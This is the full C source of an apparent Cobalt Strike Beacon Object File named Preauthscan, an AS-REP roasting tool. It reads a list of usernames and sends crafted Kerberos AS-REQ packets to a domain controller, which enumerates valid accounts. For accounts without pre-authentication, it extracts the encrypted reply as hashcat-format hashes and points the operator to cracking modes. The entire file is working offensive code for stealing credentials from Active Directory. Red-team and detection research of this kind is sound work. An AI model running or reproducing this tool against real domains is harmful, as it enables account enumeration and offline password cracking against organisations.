/*
 * Preauthscan BOF - AS-REP Roasting Scanner
 * ------------------------------------------
 * Scans for accounts that do not require Kerberos pre-authentication.
 * Sends AS-REQ packets for each username and identifies vulnerable accounts.
 *
 * Usage: preauthscan <domain> <dc_ip> <userlist_file>
 * Example: preauthscan corp.local 192.168.1.1 C:\users.txt
 */

#include <windows.h>
#include "../../beacon.h"

/* Winsock declarations */
DECLSPEC_IMPORT int WSAAPI WS2_32$WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
DECLSPEC_IMPORT int WSAAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT int WSAAPI WS2_32$WSAGetLastError(void);
DECLSPEC_IMPORT SOCKET WSAAPI WS2_32$socket(int af, int type, int protocol);
DECLSPEC_IMPORT int WSAAPI WS2_32$connect(SOCKET s, const struct sockaddr *name, int namelen);
DECLSPEC_IMPORT int WSAAPI WS2_32$send(SOCKET s, const char *buf, int len, int flags);
DECLSPEC_IMPORT int WSAAPI WS2_32$recv(SOCKET s, char *buf, int len, int flags);
DECLSPEC_IMPORT int WSAAPI WS2_32$closesocket(SOCKET s);
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$inet_addr(const char *cp);
DECLSPEC_IMPORT u_short WSAAPI WS2_32$htons(u_short hostshort);
DECLSPEC_IMPORT u_long WSAAPI WS2_32$htonl(u_long hostlong);

/* Kernel32 declarations */
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT void WINAPI KERNEL32$Sleep(DWORD);

/* MSVCRT declarations */
DECLSPEC_IMPORT void *__cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void *__cdecl MSVCRT$realloc(void *, size_t);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void *);
DECLSPEC_IMPORT void *__cdecl MSVCRT$memset(void *, int, size_t);
DECLSPEC_IMPORT void *__cdecl MSVCRT$memcpy(void *, const void *, size_t);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char *);
DECLSPEC_IMPORT char *__cdecl MSVCRT$strchr(const char *, int);
DECLSPEC_IMPORT int __cdecl MSVCRT$_stricmp(const char *, const char *);

#define malloc      MSVCRT$malloc
#define realloc     MSVCRT$realloc
#define free        MSVCRT$free
#define memset      MSVCRT$memset
#define memcpy      MSVCRT$memcpy
#define strlen      MSVCRT$strlen
#define strchr      MSVCRT$strchr
#define stricmp     MSVCRT$_stricmp

/* Kerberos constants */
#define KRB5_PORT           88
#define KRB5_AS_REQ         10
#define KRB5_AS_REP         11
#define KRB5_ERROR          30
#define KRB5_NT_PRINCIPAL   1
#define KRB5_ETYPE_RC4      23      /* RC4-HMAC */
#define KRB5_ETYPE_AES128   17      /* AES128-CTS-HMAC-SHA1-96 */
#define KRB5_ETYPE_AES256   18      /* AES256-CTS-HMAC-SHA1-96 */

/* Kerberos error codes */
#define KDC_ERR_PREAUTH_REQUIRED    25
#define KDC_ERR_C_PRINCIPAL_UNKNOWN 6
#define KDC_ERR_CLIENT_REVOKED      18

/* ASN.1 tags */
#define ASN1_SEQUENCE       0x30
#define ASN1_INTEGER        0x02
#define ASN1_OCTET_STRING   0x04
#define ASN1_BIT_STRING     0x03
#define ASN1_GENERAL_STRING 0x1B
#define ASN1_GENERALIZED_TIME 0x18
#define ASN1_CONTEXT_0      0xA0
#define ASN1_CONTEXT_1      0xA1
#define ASN1_CONTEXT_2      0xA2
#define ASN1_CONTEXT_3      0xA3
#define ASN1_CONTEXT_4      0xA4
#define ASN1_CONTEXT_5      0xA5
#define ASN1_CONTEXT_6      0xA6
#define ASN1_CONTEXT_7      0xA7
#define ASN1_APPLICATION    0x60

/* Base64 encoding table */
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/* Global counters */
static int g_vulnerable = 0;
static int g_notfound = 0;
static int g_preauth_required = 0;
static int g_errors = 0;

/* Buffer helper structure */
typedef struct {
    unsigned char *data;
    size_t len;
    size_t cap;
} Buffer;

static void buf_init(Buffer *b, size_t cap) {
    b->data = (unsigned char *)malloc(cap);
    b->len = 0;
    b->cap = cap;
}

static void buf_free(Buffer *b) {
    if (b->data) free(b->data);
    b->data = NULL;
    b->len = 0;
    b->cap = 0;
}

static void buf_append(Buffer *b, const void *data, size_t len) {
    if (b->len + len > b->cap) {
        b->cap = (b->len + len) * 2;
        b->data = (unsigned char *)realloc(b->data, b->cap);
    }
    memcpy(b->data + b->len, data, len);
    b->len += len;
}

static void buf_append_byte(Buffer *b, unsigned char byte) {
    buf_append(b, &byte, 1);
}

/* ASN.1 DER encoding helpers */
static void asn1_encode_length(Buffer *b, size_t len) {
    if (len < 128) {
        buf_append_byte(b, (unsigned char)len);
    } else if (len < 256) {
        buf_append_byte(b, 0x81);
        buf_append_byte(b, (unsigned char)len);
    } else if (len < 65536) {
        buf_append_byte(b, 0x82);
        buf_append_byte(b, (unsigned char)(len >> 8));
        buf_append_byte(b, (unsigned char)(len & 0xFF));
    } else {
        buf_append_byte(b, 0x83);
        buf_append_byte(b, (unsigned char)(len >> 16));
        buf_append_byte(b, (unsigned char)((len >> 8) & 0xFF));
        buf_append_byte(b, (unsigned char)(len & 0xFF));
    }
}

static void asn1_wrap(Buffer *out, unsigned char tag, const Buffer *inner) {
    buf_append_byte(out, tag);
    asn1_encode_length(out, inner->len);
    buf_append(out, inner->data, inner->len);
}

static void asn1_integer(Buffer *b, int value) {
    Buffer inner;
    buf_init(&inner, 8);

    if (value == 0) {
        buf_append_byte(&inner, 0);
    } else if (value < 128) {
        buf_append_byte(&inner, (unsigned char)value);
    } else if (value < 256) {
        buf_append_byte(&inner, 0);
        buf_append_byte(&inner, (unsigned char)value);
    } else {
        /* Handle larger integers */
        if (value & 0x800000) buf_append_byte(&inner, 0);
        if (value > 0xFFFF) buf_append_byte(&inner, (unsigned char)((value >> 16) & 0xFF));
        if (value > 0xFF) buf_append_byte(&inner, (unsigned char)((value >> 8) & 0xFF));
        buf_append_byte(&inner, (unsigned char)(value & 0xFF));
    }

    asn1_wrap(b, ASN1_INTEGER, &inner);
    buf_free(&inner);
}

static void asn1_general_string(Buffer *b, const char *str) {
    Buffer inner;
    buf_init(&inner, strlen(str) + 1);
    buf_append(&inner, str, strlen(str));
    asn1_wrap(b, ASN1_GENERAL_STRING, &inner);
    buf_free(&inner);
}

static void asn1_context_wrap(Buffer *out, int context, const Buffer *inner) {
    buf_append_byte(out, (unsigned char)(ASN1_CONTEXT_0 + context));
    asn1_encode_length(out, inner->len);
    buf_append(out, inner->data, inner->len);
}

/* Build PrincipalName (SEQUENCE of name-type and name-string) */
static void build_principal_name(Buffer *out, int name_type, const char *name) {
    Buffer name_type_buf, name_string_buf, name_seq, principal_seq;

    buf_init(&name_type_buf, 16);
    buf_init(&name_string_buf, 64);
    buf_init(&name_seq, 64);
    buf_init(&principal_seq, 128);

    /* name-type [0] INTEGER */
    asn1_integer(&name_type_buf, name_type);
    asn1_context_wrap(&principal_seq, 0, &name_type_buf);

    /* name-string [1] SEQUENCE OF GeneralString */
    asn1_general_string(&name_string_buf, name);
    asn1_wrap(&name_seq, ASN1_SEQUENCE, &name_string_buf);
    asn1_context_wrap(&principal_seq, 1, &name_seq);

    asn1_wrap(out, ASN1_SEQUENCE, &principal_seq);

    buf_free(&name_type_buf);
    buf_free(&name_string_buf);
    buf_free(&name_seq);
    buf_free(&principal_seq);
}

/* Build KDC-REQ-BODY for AS-REQ */
static void build_kdc_req_body(Buffer *out, const char *domain, const char *username) {
    Buffer body, tmp, etype_seq, etype_list;

    buf_init(&body, 512);
    buf_init(&tmp, 256);
    buf_init(&etype_seq, 64);
    buf_init(&etype_list, 64);

    /* kdc-options [0] KDCOptions (BIT STRING) - forwardable, renewable, canonicalize */
    buf_append_byte(&tmp, ASN1_BIT_STRING);
    buf_append_byte(&tmp, 5);
    buf_append_byte(&tmp, 0);       /* unused bits */
    buf_append_byte(&tmp, 0x40);    /* forwardable */
    buf_append_byte(&tmp, 0x81);    /* renewable, canonicalize */
    buf_append_byte(&tmp, 0x00);
    buf_append_byte(&tmp, 0x00);
    asn1_context_wrap(&body, 0, &tmp);
    buf_free(&tmp);
    buf_init(&tmp, 256);

    /* cname [1] PrincipalName - client principal */
    build_principal_name(&tmp, KRB5_NT_PRINCIPAL, username);
    asn1_context_wrap(&body, 1, &tmp);
    buf_free(&tmp);
    buf_init(&tmp, 256);

    /* realm [2] Realm (GeneralString) */
    asn1_general_string(&tmp, domain);
    asn1_context_wrap(&body, 2, &tmp);
    buf_free(&tmp);
    buf_init(&tmp, 256);

    /* sname [3] PrincipalName - service principal (krbtgt/REALM) */
    {
        Buffer sname_type, sname_strings, sname_seq, sname_principal;
        buf_init(&sname_type, 16);
        buf_init(&sname_strings, 128);
        buf_init(&sname_seq, 128);
        buf_init(&sname_principal, 256);

        /* name-type = 2 (NT-SRV-INST) */
        asn1_integer(&sname_type, 2);
        asn1_context_wrap(&sname_principal, 0, &sname_type);

        /* name-string = ["krbtgt", REALM] */
        asn1_general_string(&sname_strings, "krbtgt");
        asn1_general_string(&sname_strings, domain);
        asn1_wrap(&sname_seq, ASN1_SEQUENCE, &sname_strings);
        asn1_context_wrap(&sname_principal, 1, &sname_seq);

        asn1_wrap(&tmp, ASN1_SEQUENCE, &sname_principal);
        asn1_context_wrap(&body, 3, &tmp);

        buf_free(&sname_type);
        buf_free(&sname_strings);
        buf_free(&sname_seq);
        buf_free(&sname_principal);
    }
    buf_free(&tmp);
    buf_init(&tmp, 256);

    /* till [5] KerberosTime - request ticket valid until far future */
    buf_append_byte(&tmp, ASN1_GENERALIZED_TIME);
    buf_append_byte(&tmp, 15);
    buf_append(&tmp, "20370913024805Z", 15);
    asn1_context_wrap(&body, 5, &tmp);
    buf_free(&tmp);
    buf_init(&tmp, 256);

    /* nonce [7] UInt32 */
    asn1_integer(&tmp, 12345678);
    asn1_context_wrap(&body, 7, &tmp);
    buf_free(&tmp);

    /* etype [8] SEQUENCE OF Int32 - supported encryption types */
    asn1_integer(&etype_list, KRB5_ETYPE_AES256);
    asn1_integer(&etype_list, KRB5_ETYPE_AES128);
    asn1_integer(&etype_list, KRB5_ETYPE_RC4);
    asn1_wrap(&etype_seq, ASN1_SEQUENCE, &etype_list);
    asn1_context_wrap(&body, 8, &etype_seq);

    asn1_wrap(out, ASN1_SEQUENCE, &body);

    buf_free(&body);
    buf_free(&etype_seq);
    buf_free(&etype_list);
}

/* Build complete AS-REQ */
static void build_as_req(Buffer *out, const char *domain, const char *username) {
    Buffer asreq, pvno, msg_type, req_body;

    buf_init(&asreq, 1024);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&req_body, 512);

    /* pvno [1] INTEGER (5) */
    asn1_integer(&pvno, 5);
    asn1_context_wrap(&asreq, 1, &pvno);

    /* msg-type [2] INTEGER (10 = AS-REQ) */
    asn1_integer(&msg_type, KRB5_AS_REQ);
    asn1_context_wrap(&asreq, 2, &msg_type);

    /* No padata [3] - this is the key for AS-REP roasting! */

    /* req-body [4] KDC-REQ-BODY */
    build_kdc_req_body(&req_body, domain, username);
    asn1_context_wrap(&asreq, 4, &req_body);

    /* Wrap in APPLICATION 10 tag */
    buf_append_byte(out, ASN1_APPLICATION + KRB5_AS_REQ);
    asn1_encode_length(out, asreq.len);
    buf_append(out, asreq.data, asreq.len);

    buf_free(&asreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&req_body);
}

/* Base64 encode for hash output */
static void base64_encode(const unsigned char *input, size_t len, char *output) {
    size_t i, j;
    for (i = 0, j = 0; i < len; ) {
        unsigned int a = i < len ? input[i++] : 0;
        unsigned int b = i < len ? input[i++] : 0;
        unsigned int c = i < len ? input[i++] : 0;
        unsigned int triple = (a << 16) | (b << 8) | c;
        output[j++] = base64_table[(triple >> 18) & 0x3F];
        output[j++] = base64_table[(triple >> 12) & 0x3F];
        output[j++] = base64_table[(triple >> 6) & 0x3F];
        output[j++] = base64_table[triple & 0x3F];
    }
    /* Padding */
    size_t mod = len % 3;
    if (mod == 1) { output[j-1] = '='; output[j-2] = '='; }
    else if (mod == 2) { output[j-1] = '='; }
    output[j] = '\0';
}

/* Parse ASN.1 length */
static size_t parse_asn1_length(const unsigned char *data, size_t *offset) {
    unsigned char b = data[*offset];
    (*offset)++;

    if (b < 128) {
        return b;
    }

    int num_bytes = b & 0x7F;
    size_t len = 0;
    for (int i = 0; i < num_bytes; i++) {
        len = (len << 8) | data[*offset];
        (*offset)++;
    }
    return len;
}

/* Parse Kerberos error code from KRB-ERROR */
static int parse_krb_error(const unsigned char *data, size_t len) {
    size_t offset = 0;

    /* Skip APPLICATION 30 tag */
    if (data[offset] != (ASN1_APPLICATION + KRB5_ERROR)) return -1;
    offset++;
    parse_asn1_length(data, &offset);

    /* Skip SEQUENCE */
    if (data[offset] != ASN1_SEQUENCE) return -1;
    offset++;
    parse_asn1_length(data, &offset);

    /* Look for error-code [6] INTEGER */
    while (offset < len - 2) {
        unsigned char tag = data[offset];
        offset++;
        size_t field_len = parse_asn1_length(data, &offset);

        if (tag == ASN1_CONTEXT_6) {
            /* Found error-code field */
            if (data[offset] == ASN1_INTEGER) {
                offset++;
                size_t int_len = parse_asn1_length(data, &offset);
                int error_code = 0;
                for (size_t i = 0; i < int_len; i++) {
                    error_code = (error_code << 8) | data[offset + i];
                }
                return error_code;
            }
        }
        offset += field_len;
    }
    return -1;
}

/* Extract AS-REP hash for cracking */
static int extract_asrep_hash(const unsigned char *data, size_t len, const char *username,
                               const char *domain, formatp *output) {
    size_t offset = 0;

    /* Verify AS-REP tag (APPLICATION 11) */
    if (data[offset] != (ASN1_APPLICATION + KRB5_AS_REP)) return 0;
    offset++;
    parse_asn1_length(data, &offset);

    /* Skip to enc-part which contains the encrypted data */
    /* We need to find the cipher and ciphertext */

    /* For AS-REP roasting, we need:
     * - etype (encryption type)
     * - cipher (encrypted part)
     * The hash format is: $krb5asrep$etype$username@domain:cipher_base64
     */

    int etype = 0;
    const unsigned char *cipher_data = NULL;
    size_t cipher_len = 0;

    /* Parse through AS-REP to find enc-part */
    if (data[offset] != ASN1_SEQUENCE) return 0;
    offset++;
    parse_asn1_length(data, &offset);

    /* Scan for context tags */
    while (offset < len - 4) {
        unsigned char tag = data[offset];
        if ((tag & 0xE0) != 0xA0) break; /* Not a context tag */

        offset++;
        size_t field_len = parse_asn1_length(data, &offset);
        size_t field_start = offset;

        /* enc-part is [6] */
        if (tag == ASN1_CONTEXT_6) {
            /* EncryptedData SEQUENCE */
            if (data[offset] == ASN1_SEQUENCE) {
                offset++;
                parse_asn1_length(data, &offset);

                /* Parse EncryptedData fields */
                while (offset < field_start + field_len) {
                    unsigned char enc_tag = data[offset];
                    offset++;
                    size_t enc_field_len = parse_asn1_length(data, &offset);

                    if (enc_tag == ASN1_CONTEXT_0) {
                        /* etype [0] INTEGER */
                        if (data[offset] == ASN1_INTEGER) {
                            offset++;
                            size_t int_len = parse_asn1_length(data, &offset);
                            for (size_t i = 0; i < int_len; i++) {
                                etype = (etype << 8) | data[offset + i];
                            }
                            offset += int_len;
                        } else {
                            offset += enc_field_len;
                        }
                    } else if (enc_tag == ASN1_CONTEXT_2) {
                        /* cipher [2] OCTET STRING */
                        if (data[offset] == ASN1_OCTET_STRING) {
                            offset++;
                            cipher_len = parse_asn1_length(data, &offset);
                            cipher_data = data + offset;
                            offset += cipher_len;
                        } else {
                            offset += enc_field_len;
                        }
                    } else {
                        offset += enc_field_len;
                    }
                }
            }
            break;
        }
        offset = field_start + field_len;
    }

    if (cipher_data && cipher_len > 0) {
        /* Output hash in hashcat format */
        char *b64 = (char *)malloc(cipher_len * 2);
        if (b64) {
            base64_encode(cipher_data, cipher_len, b64);

            /* Format: $krb5asrep$23$username@DOMAIN:checksum$edata2 */
            /* For RC4 (etype 23), split at byte 16 for checksum */
            if (etype == 23 && cipher_len > 16) {
                char checksum_b64[32];
                char *edata2_b64 = (char *)malloc((cipher_len - 16) * 2);
                if (edata2_b64) {
                    base64_encode(cipher_data, 16, checksum_b64);
                    base64_encode(cipher_data + 16, cipher_len - 16, edata2_b64);
                    BeaconFormatPrintf(output, "$krb5asrep$%d$%s@%s:%s$%s\n",
                                       etype, username, domain, checksum_b64, edata2_b64);
                    free(edata2_b64);
                }
            } else {
                BeaconFormatPrintf(output, "$krb5asrep$%d$%s@%s:%s\n",
                                   etype, username, domain, b64);
            }
            free(b64);
            return 1;
        }
    }
    return 0;
}

/* Send AS-REQ and check response */
static int check_user_preauth(const char *dc_ip, const char *domain, const char *username, formatp *output) {
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;
    Buffer asreq;
    unsigned char *packet = NULL;
    unsigned char recv_buf[8192];
    int result = -1;

    buf_init(&asreq, 1024);

    /* Build AS-REQ */
    build_as_req(&asreq, domain, username);

    /* Create TCP packet with length prefix (4 bytes big-endian) */
    packet = (unsigned char *)malloc(asreq.len + 4);
    if (!packet) goto cleanup;

    packet[0] = (unsigned char)((asreq.len >> 24) & 0xFF);
    packet[1] = (unsigned char)((asreq.len >> 16) & 0xFF);
    packet[2] = (unsigned char)((asreq.len >> 8) & 0xFF);
    packet[3] = (unsigned char)(asreq.len & 0xFF);
    memcpy(packet + 4, asreq.data, asreq.len);

    /* Create socket */
    sock = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        BeaconFormatPrintf(output, "[-] Failed to create socket\n");
        goto cleanup;
    }

    /* Connect to KDC */
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = WS2_32$htons(KRB5_PORT);
    server.sin_addr.s_addr = WS2_32$inet_addr(dc_ip);

    if (WS2_32$connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {
        BeaconFormatPrintf(output, "[-] Failed to connect to KDC at %s:%d\n", dc_ip, KRB5_PORT);
        goto cleanup;
    }

    /* Send AS-REQ */
    if (WS2_32$send(sock, (char *)packet, (int)(asreq.len + 4), 0) <= 0) {
        BeaconFormatPrintf(output, "[-] Failed to send AS-REQ for %s\n", username);
        goto cleanup;
    }

    /* Receive response */
    memset(recv_buf, 0, sizeof(recv_buf));
    int recv_len = WS2_32$recv(sock, (char *)recv_buf, sizeof(recv_buf), 0);

    if (recv_len <= 4) {
        BeaconFormatPrintf(output, "[-] No response from KDC for %s\n", username);
        goto cleanup;
    }

    /* Skip 4-byte length prefix */
    unsigned char *response = recv_buf + 4;
    size_t response_len = recv_len - 4;

    /* Check response type */
    if (response[0] == (ASN1_APPLICATION + KRB5_AS_REP)) {
        /* Got AS-REP - user doesn't require pre-auth! */
        BeaconFormatPrintf(output, "[+] VULNERABLE: %s does not require pre-authentication!\n", username);
        if (extract_asrep_hash(response, response_len, username, domain, output)) {
            g_vulnerable++;
            result = 1;
        }
    } else if (response[0] == (ASN1_APPLICATION + KRB5_ERROR)) {
        /* Got KRB-ERROR */
        int error_code = parse_krb_error(response, response_len);

        if (error_code == KDC_ERR_PREAUTH_REQUIRED) {
            /* Pre-auth required - not vulnerable but user exists */
            g_preauth_required++;
            result = 0;
        } else if (error_code == KDC_ERR_C_PRINCIPAL_UNKNOWN) {
            /* User doesn't exist */
            g_notfound++;
            result = 0;
        } else if (error_code == KDC_ERR_CLIENT_REVOKED) {
            /* Account disabled/locked */
            BeaconFormatPrintf(output, "[!] Account disabled/locked: %s\n", username);
            result = 0;
        } else {
            BeaconFormatPrintf(output, "[!] KRB-ERROR %d for user %s\n", error_code, username);
            g_errors++;
            result = 0;
        }
    } else {
        BeaconFormatPrintf(output, "[-] Unknown response type 0x%02X for %s\n", response[0], username);
        g_errors++;
    }

cleanup:
    if (sock != INVALID_SOCKET) WS2_32$closesocket(sock);
    if (packet) free(packet);
    buf_free(&asreq);
    return result;
}

/* Read userlist file and return array of usernames */
static char **read_userlist(const char *filepath, int *count) {
    HANDLE hFile;
    DWORD fileSize, bytesRead;
    char *fileContent = NULL;
    char **usernames = NULL;
    int capacity = 100;
    int num_users = 0;

    *count = 0;

    hFile = KERNEL32$CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL,
                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    fileSize = KERNEL32$GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }

    fileContent = (char *)malloc(fileSize + 1);
    if (!fileContent) {
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }

    if (!KERNEL32$ReadFile(hFile, fileContent, fileSize, &bytesRead, NULL)) {
        free(fileContent);
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }
    KERNEL32$CloseHandle(hFile);

    fileContent[bytesRead] = '\0';

    usernames = (char **)malloc(capacity * sizeof(char *));
    if (!usernames) {
        free(fileContent);
        return NULL;
    }

    /* Parse lines */
    char *line = fileContent;
    while (*line) {
        /* Skip leading whitespace */
        while (*line == ' ' || *line == '\t') line++;

        /* Find end of line */
        char *end = line;
        while (*end && *end != '\r' && *end != '\n') end++;

        size_t line_len = end - line;

        /* Skip empty lines and comments */
        if (line_len > 0 && line[0] != '#') {
            /* Trim trailing whitespace */
            while (line_len > 0 && (line[line_len-1] == ' ' || line[line_len-1] == '\t')) {
                line_len--;
            }

            if (line_len > 0) {
                if (num_users >= capacity) {
                    capacity *= 2;
                    usernames = (char **)realloc(usernames, capacity * sizeof(char *));
                }

                usernames[num_users] = (char *)malloc(line_len + 1);
                memcpy(usernames[num_users], line, line_len);
                usernames[num_users][line_len] = '\0';
                num_users++;
            }
        }

        /* Move to next line */
        line = end;
        while (*line == '\r' || *line == '\n') line++;
    }

    free(fileContent);
    *count = num_users;
    return usernames;
}

/* Free userlist */
static void free_userlist(char **usernames, int count) {
    if (usernames) {
        for (int i = 0; i < count; i++) {
            if (usernames[i]) free(usernames[i]);
        }
        free(usernames);
    }
}

/* Entry point */
void go(char *args, int alen) {
    datap parser;
    char *domain, *dc_ip, *userlist_path;
    WSADATA wsaData;
    formatp output;
    char **usernames = NULL;
    int user_count = 0;

    /* Reset counters */
    g_vulnerable = 0;
    g_notfound = 0;
    g_preauth_required = 0;
    g_errors = 0;

    /* Parse arguments */
    BeaconDataParse(&parser, args, alen);
    domain = BeaconDataExtract(&parser, NULL);
    dc_ip = BeaconDataExtract(&parser, NULL);
    userlist_path = BeaconDataExtract(&parser, NULL);

    if (!domain || !dc_ip || !userlist_path || !*domain || !*dc_ip || !*userlist_path) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: preauthscan <domain> <dc_ip> <userlist_file>");
        BeaconPrintf(CALLBACK_ERROR, "Example: preauthscan corp.local 192.168.1.1 C:\\users.txt");
        return;
    }

    /* Initialize Winsock */
    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "WSAStartup failed");
        return;
    }

    BeaconFormatAlloc(&output, 64 * 1024);

    /* Read userlist */
    usernames = read_userlist(userlist_path, &user_count);
    if (!usernames || user_count == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to read userlist from: %s", userlist_path);
        BeaconPrintf(CALLBACK_ERROR, "Error code: %d", KERNEL32$GetLastError());
        WS2_32$WSACleanup();
        BeaconFormatFree(&output);
        return;
    }

    BeaconFormatPrintf(&output, "[*] Preauthscan - AS-REP Roasting Scanner\n");
    BeaconFormatPrintf(&output, "[*] Target domain: %s\n", domain);
    BeaconFormatPrintf(&output, "[*] Domain controller: %s\n", dc_ip);
    BeaconFormatPrintf(&output, "[*] Loaded %d usernames from: %s\n", user_count, userlist_path);
    BeaconFormatPrintf(&output, "[*] Starting scan...\n\n");

    /* Check each user */
    for (int i = 0; i < user_count; i++) {
        check_user_preauth(dc_ip, domain, usernames[i], &output);

        /* Small delay to avoid overwhelming the KDC */
        if ((i + 1) % 10 == 0) {
            KERNEL32$Sleep(100);
        }
    }

    /* Summary */
    BeaconFormatPrintf(&output, "\n[*] Scan complete!\n");
    BeaconFormatPrintf(&output, "[*] Results summary:\n");
    BeaconFormatPrintf(&output, "    - Vulnerable (no preauth): %d\n", g_vulnerable);
    BeaconFormatPrintf(&output, "    - Preauth required: %d\n", g_preauth_required);
    BeaconFormatPrintf(&output, "    - User not found: %d\n", g_notfound);
    BeaconFormatPrintf(&output, "    - Errors: %d\n", g_errors);

    if (g_vulnerable > 0) {
        BeaconFormatPrintf(&output, "\n[*] Use hashcat mode 18200 or john format krb5asrep to crack hashes\n");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

    /* Cleanup */
    free_userlist(usernames, user_count);
    BeaconFormatFree(&output);
    WS2_32$WSACleanup();
}
